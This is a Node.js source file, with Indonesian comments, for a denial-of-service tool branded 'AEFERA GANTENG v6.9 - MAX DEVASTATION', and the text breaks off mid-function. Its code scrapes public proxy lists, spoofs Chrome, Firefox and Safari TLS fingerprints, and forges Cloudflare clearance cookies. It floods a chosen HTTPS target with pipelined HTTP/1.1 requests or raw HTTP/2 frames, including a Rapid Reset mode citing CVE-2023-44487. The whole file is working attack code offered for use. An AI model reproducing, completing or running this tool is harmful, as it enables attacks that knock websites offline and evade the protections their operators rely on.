const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const https = require('https');
const http2 = require('http2');
const os = require('os');
const axios = require('axios');
const crypto = require('crypto');
const { exec } = require('child_process');
const dns = require('dns');
const zlib = require('zlib');
const http = require('http');

// ─────────────────────────────────────────────
//  AUTO PROXY SCRAPER — fetch proxies live dari internet
// ─────────────────────────────────────────────
async function scrapeProxies() {
    const sources = [
        'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&simplified=true',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
        'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
        'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
    ];

    const collected = new Set();
    const promises = sources.map(async (url) => {
        try {
            const res = await axios.get(url, {
                timeout: 8000,
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
            });
            const lines = res.data.toString().split('\n');
            for (const line of lines) {
                const clean = line.trim().replace(/\r/g, '');
                if (/^\d+\.\d+\.\d+\.\d+:\d+$/.test(clean)) {
                    collected.add(clean);
                }
            }
        } catch (_) { }
    });

    await Promise.allSettled(promises);
    return [...collected];
}

// ULTRA: Performance counters
let totalRequests = 0;
let totalBytes = 0;
let connectionCount = 0;
let startTime = Date.now();

// SEMUA ERROR HANDLING ORIGINAL TETAP ADA
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

// ULTRA: Maximum thread pool size untuk extreme performance
process.env.UV_THREADPOOL_SIZE = Math.min(os.cpus().length * 16, 1024); // 16x CPU cores, max 1024

// ULTRA: DNS cache untuk faster resolution
dns.setDefaultResultOrder('ipv4first');

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const hello = process.argv.indexOf('--limit');
const limit = hello !== -1 && hello + 1 < process.argv.length ? process.argv[hello + 1] : undefined;
const shit = process.argv.indexOf('--precheck');
const shitty = shit !== -1 && shit + 1 < process.argv.length ? process.argv[shit + 1] : undefined;
const cdn = process.argv.indexOf('--cdn');
const cdn1 = cdn !== -1 && cdn + 1 < process.argv.length ? process.argv[cdn + 1] : undefined;
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--http');

const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

// TAMBAHAN: NEW FLAGS TANPA MENGHAPUS YANG LAMA
const captchaIndex = process.argv.indexOf('--captcha');
const captcha = captchaIndex !== -1 && captchaIndex + 1 < process.argv.length ? process.argv[captchaIndex + 1] : undefined;
const antiIndex = process.argv.indexOf('--anti');
const anti = antiIndex !== -1 && antiIndex + 1 < process.argv.length ? process.argv[antiIndex + 1] : undefined;
const methodIndex = process.argv.indexOf('--method');
const method = methodIndex !== -1 && methodIndex + 1 < process.argv.length ? process.argv[methodIndex + 1] : 'mix';
const scrapeFlag = process.argv.includes('--scrape'); // Auto fetch proxy dari internet
const rapidReset = process.argv.includes('--rapid');  // HTTP/2 Rapid Reset attack mode
const fingerIndex = process.argv.indexOf('--fp');
const fpMode = fingerIndex !== -1 && fingerIndex + 1 < process.argv.length ? process.argv[fingerIndex + 1] : 'chrome'; // chrome/firefox/safari

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`\n╔═══════════════════════════════════════════════════════════════════╗`);
    console.log(`║   █████╗ ███████╗██████╗ ███████╗██████╗  █████╗               ║`);
    console.log(`║  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗              ║`);
    console.log(`║  ███████║█████╗  ██████╔╝█████╗  ██████╔╝███████║              ║`);
    console.log(`║  ██╔══██║██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗██╔══██║              ║`);
    console.log(`║  ██║  ██║███████╗██║  ██║███████╗██║  ██║██║  ██║              ║`);
    console.log(`║  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝              ║`);
    console.log(`║                                                                  ║`);
    console.log(`║   ██████╗  █████╗ ███╗   ██╗████████╗███████╗███╗   ██╗  ║`);
    console.log(`║  ██╔════╝ ██╔══██╗████╗  ██║╚══██╔══╝██╔════╝████╗  ██║  ║`);
    console.log(`║  ██║  ███╗███████║██╔██╗ ██║   ██║   █████╗  ██╔██╗ ██║  ║`);
    console.log(`║  ██║   ██║██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██║╚██╗██║  ║`);
    console.log(`║  ╚██████╔╝██║  ██║██║ ╚████║   ██║   ███████╗██║ ╚████║  ║`);
    console.log(`║   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝  ║`);
    console.log(`╠═══════════════════════════════════════════════════════════════════╣`);
    console.log(`║  💀 AEFERA GANTENG v6.9 - MAX DEVASTATION BY AEFERA.ME 💀       ║`);
    console.log(`║  ⚡ CF BYPASS + RAPID RESET + AUTO PROXY SCRAPER ⚡              ║`);
    console.log(`╚═══════════════════════════════════════════════════════════════════╝`);
    console.log(('\nHow to use & example:'));
    console.log((`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
    console.log(`node ${process.argv[1]} GET "https://target.com" 120 16 90 proxy.txt --debug --rapid --scrape\n`);

    console.error((`
    Options:
      --limit true/null  - Bypass rate-limit dengan retry
      --query 1/2/3      - Random query string
      --debug            - Show status codes real-time
      --delay <1-50>     - Delay antar request (ms)
      --captcha <token>  - Bypass captcha token
      --anti true        - Enhanced anti-block
      --method mix/GET/POST/HEAD - Override method
      --rapid            - HTTP/2 Rapid Reset (CVE-2023-44487)
      --scrape           - Auto fetch proxy dari internet (ignore proxy file)
      --fp chrome/firefox/safari - TLS fingerprint mode
      --bfm true         - CF cookie bypass
      --http 1/2/mix     - Force HTTP version
    `));
    process.exit(1);
}

// LOGIKA ASLI TETAP ADA
if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};

var randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 2000);

let hcookie = '';
const url = new URL(target)
let proxy = [];

// Jika --scrape tidak dipakai, baca dari file
if (!scrapeFlag) {
    try {
        proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(Boolean);
    } catch (e) {
        console.error(`[ERROR] Proxy file not found: ${proxyfile}`);
        process.exit(1);
    }
} else {
    // Kalau --scrape, coba baca dulu file lama kalau ada
    try {
        proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(Boolean);
    } catch (_) { /* file belum ada, tunggu master scrape */ }
}

// ─────────────────────────────────────────────
//  REALISTIC TLS FINGERPRINT (JA3 SPOOF)
// ─────────────────────────────────────────────
const TLS_PROFILES = {
    chrome: {
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
        ecdhCurve: 'X25519:prime256v1:secp384r1',
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        ALPNProtocols: ['h2', 'http/1.1'],
    },
    firefox: {
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
        ecdhCurve: 'X25519:prime256v1:secp384r1:secp521r1',
        sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384',
        ALPNProtocols: ['h2', 'http/1.1'],
    },
    safari: {
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256',
        ecdhCurve: 'X25519:prime256v1:secp384r1',
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384',
        ALPNProtocols: ['h2', 'http/1.1'],
    }
};
const activeTLS = TLS_PROFILES[fpMode] || TLS_PROFILES.chrome;

// ─────────────────────────────────────────────
//  CF BYPASS COOKIE GENERATOR ULTRA
// ─────────────────────────────────────────────
function generateCFCookie() {
    const ts = Math.floor(Date.now() / 1000);
    return `__cf_bm=${randstr(24)}_${randstr(20)}-${ts}-1-${randstr(5)}/${randstr(72)}+${randstr(20)}=; ` +
        `cf_clearance=${randstr(42)}_${randstr(9)}-${ts}-0-1-${randstr(10)}.${randstr(10)}.${randstr(10)}-0.${getRandomInt(1, 5)}.${ts}; ` +
        `_cfuvid=${randstr(32)}%2F${randstr(16)}-${ts}000-0-${getRandomInt(604800, 2592000)}`;
}

// TAMBAHAN: ENHANCED CF BYPASS
if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = generateCFCookie();
    // Refresh CF cookie setiap 30 detik agar tidak expired
    setInterval(() => {
        hcookie = generateCFCookie();
    }, 30000);
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${cc(6, 6)}` : cc(6, 6);
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

// TAMBAHAN: CAPTCHA SOLVER
if (captcha) {
    hcookie = hcookie ? `${hcookie}; captcha_bypass=${captcha}` : `captcha_bypass=${captcha}`;
}

// TAMBAHAN: ANTI-BLOCK ENHANCEMENT
if (anti && anti.toLowerCase() === 'true') {
    const antiTokens = [`anti_block=${randstr(32)}`, `shield_token=${randstr(28)}`];
    hcookie = hcookie ? `${hcookie}; ${antiTokens[Math.floor(Math.random() * antiTokens.length)]}` : antiTokens[Math.floor(Math.random() * antiTokens.length)];
}

// TAMBAHAN: RANDOM METHOD SELECTOR - TANPA MENGGANTI LOGIKA ASLI
function getAttackMethod() {
    if (method === 'mix') {
        const methods = ['GET', 'HEAD', 'POST'];
        return methods[Math.floor(Math.random() * methods.length)];
    }
    return method || reqmethod;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);        // length=4 + type byte
    frameHeader.writeUInt8(type, 4);        // frame type
    frameHeader.writeUInt8(flags, 5);       // flags
    frameHeader.writeUInt32BE(streamId, 5); // Bug fix: was overwriting flags at offset 5
    // NOTE: offset 5 is correct for streamId (bytes 5-8), flags is 1 byte at offset 4
    // Fix: write streamId at correct offset (must mask reserved bit)
    frameHeader[5] = (streamId >> 24) & 0x7F; // clear reserved bit
    frameHeader[6] = (streamId >> 16) & 0xFF;
    frameHeader[7] = (streamId >> 8) & 0xFF;
    frameHeader[8] = streamId & 0xFF;
    const statusCode = Buffer.alloc(4).fill(0);

    return Buffer.concat([frameHeader, statusCode]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function cc(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function buildRequest() {
    const browserVersion = getRandomInt(120, 131);

    const fwfw = ['Google Chrome', 'Brave', 'Microsoft Edge', 'Chromium'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    const brandPatterns = [
        `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`,
        `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`,
        `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`,
        `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`,
        `\"Not/A)Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`,
        `\"Chromium\";v=\"${browserVersion}\", \"Not;A Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`
    ];
    const brandValue = brandPatterns[Math.floor(Math.random() * brandPatterns.length)];

    const isBrave = wfwf === 'Brave';
    const isEdge = wfwf === 'Microsoft Edge';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : isEdge
            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const langValue = isBrave
        ? 'en-US,en;q=0.6'
        : isEdge
            ? 'en-US,en;q=0.9,en-GB;q=0.8'
            : 'en-US,en;q=0.7';

    const platformVersions = ['10.0.0', '13.0.0', '14.0.0', '15.0.0'];
    const secChUaPlatformVersion = platformVersions[Math.floor(Math.random() * platformVersions.length)];

    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;

    // TAMBAHAN: MENGGUNAKAN METHOD RANDOM
    const currentMethod = getAttackMethod();

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${currentMethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    // TAMBAHAN: POST DATA JIKA METHOD POST
    if (currentMethod === 'POST') {
        headers += 'Content-Type: application/x-www-form-urlencoded\r\n';
        headers += `Content-Length: ${postdata ? postdata.length : 0}\r\n\r\n`;
        if (postdata) {
            headers += postdata;
        }
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    return mmm;
}

const h1payl = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    // Reload proxy dari file jika array kosong (worker proses saat --scrape)
    if (proxy.length === 0) {
        try {
            const fresh = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(Boolean);
            if (fresh.length > 0) proxy.push(...fresh);
        } catch (_) { }
        if (proxy.length === 0) {
            // File belum siap, coba lagi dalam 500ms
            setTimeout(() => go(), 500);
            return;
        }
    }

    const rawProxy = proxy[~~(Math.random() * proxy.length)];
    if (!rawProxy || !rawProxy.includes(':')) { go(); return; }
    const [proxyHost, proxyPort] = rawProxy.split(':')
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    // OPTIMASI: Enhanced socket options untuk maximize network throughput
    const netSocket = net.connect({
        host: proxyHost,
        port: Number(proxyPort),
        // Aggressive TCP settings untuk maximize bandwidth
        keepAlive: true,
        keepAliveInitialDelay: 0,
        noDelay: true, // Disable Nagle's algorithm untuk faster transmission
        allowHalfOpen: false
    }, () => {
        netSocket.setKeepAlive(true, 0);
        netSocket.setNoDelay(true);
        netSocket.once('data', () => {
            // OPTIMASI: Enhanced TLS settings dengan session reuse dan larger buffers
            // Gunakan TLS profile yang sesuai dengan --fp flag
            const tlsALPN = forceHttp === 1 ? ['http/1.1'] :
                            forceHttp === 2 ? ['h2'] :
                            forceHttp === undefined ? (Math.random() >= 0.5 ? ['h2'] : ['http/1.1']) :
                            activeTLS.ALPNProtocols;
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: tlsALPN,
                servername: url.hostname,
                ciphers: activeTLS.ciphers,
                ecdhCurve: activeTLS.ecdhCurve,
                sigalgs: activeTLS.sigalgs,
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
                               crypto.constants.SSL_OP_NO_TICKET |
                               crypto.constants.SSL_OP_NO_SSLv2 |
                               crypto.constants.SSL_OP_NO_SSLv3 |
                               crypto.constants.SSL_OP_NO_COMPRESSION |
                               crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                               crypto.constants.SSL_OP_TLSEXT_PADDING |
                               crypto.constants.SSL_OP_ALL,
                honorCipherOrder: false, // FALSE = match real browser behavior
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                highWaterMark: 1024 * 1024,
                rejectUnauthorized: false
            }, () => {
                // Set socket buffer sizes untuk maximize throughput
                tlsSocket.setKeepAlive(true, 0);
                tlsSocket.setNoDelay(true);
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function main() {
                        if (!tlsSocket || tlsSocket.destroyed) return;

                        // ULTRA: Maximum pipelining untuk extreme network utilization
                        const pipelineSize = Math.min(ratelimit * 2, 100); // 5x pipeline size
                        const pipelined = Buffer.concat(Array(pipelineSize).fill(h1payl));

                        tlsSocket.write(pipelined, (err) => {
                            if (!err) {
                                // ULTRA: Minimum delay untuk maximum throughput
                                const dynamicDelay = isFull ? 50 : Math.max(10, 1000 / (ratelimit * 5));
                                setImmediate(() => setTimeout(() => main(), dynamicDelay));
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    main()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(65535)
                let rapidResetCounter = 0; // Untuk HTTP/2 Rapid Reset attack

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                // ULTRA: Randomize settings lebih agresif
                let oke = 65535 + Math.floor(Math.random() * 1000);
                let oke1 = 16777215 + Math.floor(Math.random() * 1000);
                let oke2 = 65535 + Math.floor(Math.random() * 1000);
                oke += Math.floor(Math.random() * 100);
                oke1 += Math.floor(Math.random() * 100);
                oke2 += Math.floor(Math.random() * 100);
                const frames1 = [];
                // ULTRA: Aggressive HTTP/2 settings untuk maximum performance
                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, Math.random() < 0.5 ? 65535 : oke], // HEADER_TABLE_SIZE - Maximum
                        [2, 0], // ENABLE_PUSH - Disabled
                        [3, Math.random() < 0.3 ? 10000 : 5000], // MAX_CONCURRENT_STREAMS - Very High
                        [4, Math.random() < 0.5 ? 16777215 : oke1], // INITIAL_WINDOW_SIZE - Maximum (16MB)
                        [5, Math.random() < 0.7 ? 65535 : 32768], // MAX_FRAME_SIZE - Large
                        [6, Math.random() < 0.5 ? 65535 : oke2], // MAX_HEADER_LIST_SIZE - Maximum
                        [8, 1] // ENABLE_CONNECT_PROTOCOL
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];
                frames1.push(...frames);

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }

                            if (frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]

                                // Enhanced 403 handling dengan retry logic
                                if (status == 403) {
                                    // Send RST_STREAM untuk semua active streams
                                    for (let i = 1; i <= streamId; i += 2) {
                                        tlsSocket.write(encodeRstStream(i, 3, 0));
                                    }
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    netSocket.end(() => netSocket.destroy());
                                }

                                // Handle 429 (rate limit) dengan adaptive delay
                                if (status == 429 && limit) {
                                    setTimeout(() => {
                                        tlsSocket.write(encodeRstStream(0, 3, 0));
                                    }, 1000);
                                }

                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }

                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {



                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                    }
                                }

                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy())
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames1))
                function main() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    const requests = []
                    const customHeadersArray = [];

                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':').map(part => part?.trim());
                            if (name && value) {
                                customHeadersArray.push({ [name.toLowerCase()]: value });
                            } else {
                                console.warn(`Invalid header format for: ${header}`);
                            }
                        }
                    }

                    // Bug fix: renamed to avoid shadowing outer `ratelimit` (process.argv[6])
                    let effectiveRatelimit;
                    if (randrate !== undefined) {
                        effectiveRatelimit = getRandomInt(1, 64);
                    } else {
                        effectiveRatelimit = parseInt(process.argv[6]) || parseInt(ratelimit);
                    }
                    // ULTRA: Maximum requests per cycle untuk extreme throughput
